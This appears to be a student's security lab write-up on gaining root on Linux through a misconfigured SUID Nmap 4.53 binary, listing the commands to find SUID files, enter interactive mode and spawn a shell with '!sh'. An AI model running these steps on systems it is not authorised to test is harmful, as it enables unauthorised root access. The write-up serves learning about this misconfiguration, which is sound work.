# Lab05 – Privilege Escalation via SUID Nmap Binary

## Objective
Gain root privileges on a Linux system by exploiting a misconfigured SUID binary of an older Nmap version with interactive shell mode.

## Vulnerability
Nmap version 4.53 is installed with the SUID bit set. This version allows execution of system commands through interactive mode using `!sh`.

## Steps

1. **Identify SUID binaries:**
   ```bash
   find / -perm -4000 -type f -name "*nmap*" 2>/dev/null
   
2. **Run Nmap in interactive mode:**
   ```bash
   /usr/bin/nmap --interactive
   
3. **Spawn a root shell:**
   ```bash
   nmap> !sh
   
4. **Verify root access:**
   ```bash
   whoami
   id

## Screenshot
![Nmap Privilege Escalation](../Screen Shot 2025-05-29 at 15.36.53.png)

## What I Learned
Learned how SUID binaries can be exploited for local privilege escalation

Understood the risks of leaving outdated tools with elevated privileges

Successfully gained root shell through nmap --interactive feature

## Date

29 May 2025
